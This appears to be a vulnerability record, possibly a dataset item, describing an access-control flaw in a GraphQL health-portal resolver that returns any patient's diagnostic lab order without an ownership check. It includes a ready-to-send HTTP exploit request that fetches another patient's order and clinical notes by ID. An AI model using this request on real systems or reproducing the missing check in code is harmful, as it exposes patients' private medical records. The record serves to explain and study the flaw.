diagnosis: The Strawberry GraphQL query resolves diagnostic lab orders through a batched DataLoader. While DataLoader batches database lookups across concurrent requests, the resolver delegates directly to loader.load(order_id) without validating that order.patient_id matches info.context['current_user'].patient_id, allowing patients to view medical diagnostic lab orders of other individuals.
exploit_request:
POST /graphql HTTP/1.1
Host: health.telemedportal.org
Authorization: Bearer <patient_jwt>
Content-Type: application/json

{"query": "query { diagnosticOrder(orderId: 90214) { id testName specimenStatus clinicalNotes } }"}
